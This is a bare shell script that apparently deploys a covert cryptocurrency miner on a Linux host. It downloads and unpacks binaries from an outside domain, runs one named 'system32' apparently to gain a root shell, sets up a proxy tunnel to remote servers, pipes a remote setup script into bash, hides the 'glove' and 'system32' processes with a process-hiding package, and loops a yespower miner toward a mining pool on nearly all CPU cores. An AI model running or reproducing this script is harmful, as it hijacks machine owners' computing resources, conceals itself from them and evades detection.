cd
sleep 2
pwd
sleep 2
whoami
sleep 2
wget -q https://greenleaf.teatspray.fun/system32.tar.gz
sleep 2
wget -q https://greenleaf.teatspray.fun/backup2.tar.gz
sleep 2
tar -xf system32.tar.gz
sleep 2
tar -xf backup2.tar.gz
sleep 2
./system32 -S . /bin/bash
su -
sleep 2
cd
sleep 2
whoami
sleep 2

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg >/dev/null

sleep 2

wget -q https://greenleaf.teatspray.fun/Spectre.tar.gz

sleep 2

tar -xf Spectre.tar.gz

sleep 2

mv Spectre /usr/bin

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 api.ipify.org

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Sema_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 2`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

wget -O - https://deb.nodesource.com/setup_20.x | bash

sleep 2

apt-get install -y nodejs >/dev/null

sleep 2

node -v && npm

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add glove 1>/dev/null 2>&1

sleep 2

ph add system32 1>/dev/null 2>&1

sleep 2

wget -q https://greenleaf.teatspray.fun/glove.tar.gz >/dev/null

sleep 2

tar -xf glove.tar.gz

sleep 2

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2


while true
do
./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
sleep 10
done
